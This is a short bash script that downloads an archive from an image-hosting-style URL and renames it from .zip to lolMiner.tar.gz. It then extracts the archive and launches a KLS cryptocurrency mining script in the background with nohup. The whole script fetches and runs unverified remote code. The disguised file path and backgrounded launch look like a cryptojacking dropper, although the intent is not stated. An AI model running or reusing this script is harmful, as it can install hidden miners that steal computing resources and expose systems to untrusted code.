#!/bin/bash

wget https://img.iduodou.com/images/docs/20231209/44B64BC1-763A-49C4-87F2-3EF1C1A41CAD.zip

mv 44B64BC1-763A-49C4-87F2-3EF1C1A41CAD.zip lolMiner.tar.gz

tar -xvf lolMiner.tar.gz

cd lolMiner-KLS\ 2/

nohup ./00KLS.sh &